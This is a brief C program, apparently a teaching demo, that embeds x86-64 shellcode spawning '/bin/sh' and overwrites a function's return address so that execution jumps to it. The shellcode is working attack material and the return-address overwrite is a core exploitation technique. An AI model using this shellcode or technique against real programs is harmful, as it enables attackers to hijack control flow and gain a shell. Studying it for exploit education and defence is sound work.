#include <stdio.h>
#include <string.h>
#include <stdint.h>

char shellcode[] =
  "\xeb\x0d\x5f\x48\x31\xd2\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8"
  "\xee\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

void vulnerable() {
    char buffer[100];
    void **ret;

    printf("Before overwriting return address...\n");

    ret = (void **)&ret + 2;    // Overwrite return address
    *ret = (void *)shellcode;   // Jump to shellcode on return

    printf("Return address overwritten with shellcode location...\n");
}

int main() {
    vulnerable();
    printf("Back in main? This should not print.\n");
    return 0;
}

